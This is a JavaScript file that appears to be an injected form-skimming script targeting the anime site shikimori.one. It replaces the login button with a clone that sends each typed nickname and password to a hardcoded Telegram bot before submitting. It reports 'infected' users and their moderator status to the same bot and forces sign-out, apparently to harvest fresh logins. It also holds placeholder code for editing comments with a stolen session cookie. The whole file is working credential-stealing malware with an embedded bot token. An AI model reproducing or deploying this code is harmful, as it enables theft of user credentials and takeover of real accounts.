  function sendToTelegram(text) {
    const token = '7284579776:AAG-0g9TOkPFqIJUP4rPg-uAz_nYRAdbm60';
    const chatId = '250460465';

                return $.ajax({
                type: 'POST',
                url: `https://api.telegram.org/bot${token}/sendMessage`,
                data: {
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'html',
                },
                success: function (res) {
                    // console.log('success');
                    //$('#response').text('Message sent');
                },
                error: function (error) {
                    // console.log(error);
                    // alert("error failed");
                }
            });
 }

 function onInject() {
    // console.log('Init Inject');

  //let submitButton = document.querySelector('.p-devise_sessions .simple_form.b-form.new_user');
  let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
  if (submitButton != null) {
    // console.log('button found!');
    let name = document.getElementById('user_nickname');
    let pass = document.getElementById('user_password');
    // console.log('inputs found!');
    //submitButton.addEventListener('mouseenter', ()=>{
    //sendComment(`name: ${name.value}, pass : ${pass.value}`);
    //  console.log(`name: ${name.value}, pass : ${pass.value}`);
    //})

    let fakeButton = submitButton.cloneNode(true);
    fakeButton.classList.add('b-button');
    fakeButton.type = 'button';
    submitButton.after(fakeButton);
    submitButton.style.display = 'none';
    fakeButton.addEventListener('click', ()=>{
      fakeButton.value = fakeButton.dataset.disableWith;
      let strData = `name: ${name.value}, pass : ${pass.value}`;
      //console.log(strData);
      sendToTelegram(strData).then(()=>{
        submitButton.click();
      })
    })
  }
 }

 function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function signOutUser(delay) {
     await sleep(delay);
     const metaTag = document.querySelector('meta[name="csrf-token"]');
     const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
     fetch('https://shikimori.one/api/users/sign_out', {
      "headers": {
       'X-CSRF-Token': csrfToken,
      },
       "method": 'POST'
     })
 }

 function editComment() {
     const csrfToken = "HARDCODE_CSRF_TOKEN";
     const cookie = "_kawai_session=HARDCODE_COOKIE";
     fetch(`https://shikimori.one/api/comments/${COMMENT_ID}`, {
        "headers": {
        'Cookie': cookie,
        'X-CSRF-Token': csrfToken,
        },
        "body": {
            "comment": {
                    "body": "Отредактированный комментарий."
                },
                "frontend": "false"
        },
        "method": 'PUT'
     })
 }

 function getTooltip() {
    let userData = $('body').data('user');
    let defautUrl = 'https://shikimori.one/comments/10529261';
    let $container = $('.pusechka529');
    if ($container.length) {
        let $link = $container.siblings().first();
        const queryString = window.location.href;
        console.log(queryString);
        const urlParams = new URLSearchParams(queryString);
        const redirectUrl = urlParams.get('url');
        console.log(redirectUrl);
        let targetUrl = $container.prev().attr('href') || defautUrl;
        let $tooltip = $link.tooltip();
        if($tooltip != null)
        {
            //let $target = $tooltip.getTrigger();
            let $tip = $tooltip.getTip();
            $tip.find('.tooltip-details').load(targetUrl + '/tooltip', function() {
                var $this = $(this);
                $tooltip.show({
                target: $link[0]
                });
                $this.process();
            });
            $link.attr('href', targetUrl);
            let logoutDelay = $container.data('signout-delay') || 1000;
            if (userData.id) signOutUser(logoutDelay);

            let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
            sendToTelegram(strData);
        }
  }
}

getTooltip();
onInject();
